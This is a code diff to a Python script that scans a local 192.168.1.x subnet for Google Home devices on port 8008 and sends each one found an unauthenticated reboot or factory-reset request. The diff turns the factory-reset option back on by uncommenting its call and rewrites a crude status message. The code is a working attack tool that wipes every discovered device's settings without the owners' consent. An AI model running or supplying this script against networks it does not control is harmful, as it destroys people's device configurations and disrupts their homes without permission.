@@ -20,7 +20,6 @@ for i in range(255):
             find = requests.get('http://192.168.1.{}:8008/setup/assistant/alarms'.format(i), timeout=.5)
             if find.status_code == 200:
                 gHomes.append(i)
-                print(i)
         except:
             None
         bar.next()
@@ -63,7 +62,7 @@ def factoryReset ():
     os.system('cls')
     for ipAddress in gHomes:
         requests.post('http://192.168.1.{}:8008/setup/reboot'.format(ipAddress), json={"params": "fdr"})
-        print('[{}] Deadass B? You just factory reset that bitch!'.format(datetime.datetime.now().strftime('%X')))
+        print('[{}] Google Home was reset to factory settings!'.format(datetime.datetime.now().strftime('%X')))
     time.sleep(2)
     input('\n[{}] Press ENTER to go back to the main menu...'.format(datetime.datetime.now().strftime('%X')))
     mainMenu()
@@ -79,8 +78,8 @@ def mainMenu ():
     if choice == '2':
         reboot()
     if choice == '3':
-        #factoryReset()
-        mainMenu()
+        factoryReset()
+        #mainMenu()
     else:
         mainMenu()
 
